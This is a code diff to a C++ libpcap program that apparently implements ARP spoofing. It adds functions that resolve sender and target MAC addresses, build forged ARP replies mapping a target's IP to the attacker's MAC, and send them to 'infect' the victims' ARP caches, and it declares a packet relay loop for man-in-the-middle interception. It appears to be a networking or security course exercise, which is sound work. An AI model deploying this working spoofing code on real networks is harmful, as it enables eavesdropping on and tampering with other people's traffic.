@@ -9,6 +9,8 @@
 
 using namespace std;
 
+////////////// resolve sender and target mac address //////////////////////
+
 pcap_t* openCaptureHandle(const char* interfaceName);
 
 MacAddress getMyMacAddress(const char* interfaceName);
@@ -21,7 +23,23 @@ MacAddress receiveArpReply(pcap_t* handle, const IpAddress& targetIp);
 
 MacAddress resolveMacAddress(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, const IpAddress& targetIp);
 
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////// infect part /////////////////////////////////////
+
+vector<Flow> parseFlows(int argc, char* argv[]);
+void resolveFlowMacAddresses(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, vector<Flow>& flows);
+
+ArpPacket makeArpReplyPacket(const MacAddress& senderMac, const MacAddress& myMac, const IpAddress& targetIp, const IpAddress& senderIp);
+void infectFlow(pcap_t* handle, const MacAddress& myMac, const Flow& flow);
+void infectFlows(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows); // loof infectflow
+
+////////////////////// relayLoop part ////////////////////////////////////
+
+bool isFromSenderToTarget(const EthernetHeader& ethernetHeader, const Flow& flow);
+bool isFromTargetToSender(const EthernetHeader& ethernetHeader, const Flow& flow);
+
+void relayPacket(pcap_t* handle, const u_char* packetData, std::uint32_t packetLength, const MacAddress& destinationMac);
+void relayLoop(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows);
+//////////////////////////  function  /////////////////////////////////////////////////////
 
 void usage() 
 {
@@ -107,7 +125,7 @@ ArpPacket makeArpRequestPacket(const MacAddress& myMac, const IpAddress& myIp, c
 
 	packet.arpHeader.sourceMac = myMac;
 	packet.arpHeader.sourceIp = myIp;
-	packet.arpHeader.targetMac = MacAddress("00:00:00:00:00:00"); // broadcast
+	packet.arpHeader.targetMac = MacAddress("00:00:00:00:00:00"); // unknown target
 	packet.arpHeader.targetIp = targetIp;
 
 	return packet;
@@ -162,20 +180,103 @@ MacAddress resolveMacAddress(pcap_t* handle, const MacAddress& myMac, const IpAd
 	return targetMac;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+vector<Flow> parseFlows(int argc, char* argv[])
+{
+	vector <Flow> flows;
+
+	for (int index = 2; index < argc; index += 2)
+	{
+		Flow flow{};
+		flow.senderIp = IpAddress(argv[index]);
+		flow.targetIp = IpAddress(argv[index + 1]);
+		flows.push_back(flow);
+	}
+
+	return flows; 
+}
+
+void resolveFlowMacAddresses(pcap_t* handle, const MacAddress& myMac, const IpAddress& myIp, vector<Flow>& flows)
+{
+	for (Flow& flow : flows)
+	{
+		flow.senderMac = resolveMacAddress(handle, myMac, myIp, flow.senderIp);
+		flow.targetMac = resolveMacAddress(handle, myMac, myIp, flow.targetIp);
+	}
+}
+
+// infect packet 
+ArpPacket makeArpReplyPacket(const MacAddress& senderMac, const MacAddress& myMac, const IpAddress& targetIp, const IpAddress& senderIp)
+{
+	ArpPacket packet{};
+
+	packet.ethernetHeader.destinationMac = senderMac;
+	packet.ethernetHeader.sourceMac = myMac;
+	packet.ethernetHeader.etherType = htons(EthernetHeader::kArp);
+
+	packet.arpHeader.hardwareType = htons(ArpHeader::kEthernet);
+	packet.arpHeader.protocolType = htons(EthernetHeader::kIpv4);
+	packet.arpHeader.hardwareLength = MacAddress::kSize;
+	packet.arpHeader.protocolLength = IpAddress::kSize;
+	packet.arpHeader.operation = htons(ArpHeader::kReply);
+
+	packet.arpHeader.sourceMac = myMac;
+	packet.arpHeader.sourceIp = targetIp;
+	packet.arpHeader.targetMac = senderMac;
+	packet.arpHeader.targetIp = senderIp;
+
+	return packet;
+}
+
+void infectFlow(pcap_t* handle, const MacAddress& myMac, const Flow& flow)
+{
+	ArpPacket packet = makeArpReplyPacket(flow.senderMac, myMac, flow.targetIp, flow.senderIp);
+
+	const int result = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), ArpPacket::kSize);
+
+	if (result != 0)
+		throw runtime_error(pcap_geterr(handle));
+}
+
+void infectFlows(pcap_t* handle, const MacAddress& myMac, const vector<Flow>& flows)
+{
+	for (const Flow& flow : flows)
+	{
+		infectFlow(handle, myMac, flow);
+	}
+}
+
+bool isFromSenderToTarget(const EthernetHeader& ethernetHeader, const Flow& flow)
+{
+	return 
+		memcmp(ethernetHeader.sourceMac.macAddress,
+			flow.senderMac.macAddress,MacAddress::kSize) == 0;
+}
+
+bool isFromTargetToSender(const EthernetHeader& ethernetHeader, const Flow& flow)
+{
+	return 
+		memcmp(ethernetHeader.sourceMac.macAddress,
+			flow.targetMac.macAddress,MacAddress::kSize) == 0;
+}
+
+//////////////////////////////  main  ////////////////////////////////////////////////////////////////////////////
 int main(int argc, char* argv[])
 {
-	if (argc <= 2 || argc % 2 != 0)
+	if (argc < 4 || argc % 2 != 0)
 	{
 		usage();
 		return -1; 
 	}
 	const char* interfaceName = argv[1];
+	vector<Flow> flows = parseFlows(argc, argv);
 	
 	pcap_t* handle = openCaptureHandle(interfaceName);
 
 	MacAddress myMac = getMyMacAddress(interfaceName);
 	IpAddress myIp = getMyIpAddress(interfaceName);
+
+	resolveFlowMacAddresses(handle, myMac, myIp, flows);
+	infectFlows(handle, myMac, flows);
 
 	pcap_close(handle);
 	return 0;
